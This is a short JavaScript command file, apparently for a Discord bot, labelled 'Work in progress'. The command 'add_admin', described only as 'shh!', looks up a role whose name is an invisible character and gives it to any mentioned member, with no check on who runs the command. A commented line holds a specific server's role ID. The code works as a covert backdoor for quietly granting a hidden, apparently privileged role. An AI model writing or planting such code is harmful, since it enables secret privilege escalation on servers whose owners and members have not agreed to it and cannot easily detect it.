// Work in progress

module.exports = {
  name: 'add_admin',
  description: 'shh!',
  execute(message, args) {
    const role = message.guild.roles.cache.find(r => r.name === "﻿");
    // Z server role ID: let role = message.guild.roles.cache.get("804596713214050336");
    const member = message.mentions.members.first();
    // Add the role!
    member.roles.add(role).catch(console.error);
  },
};
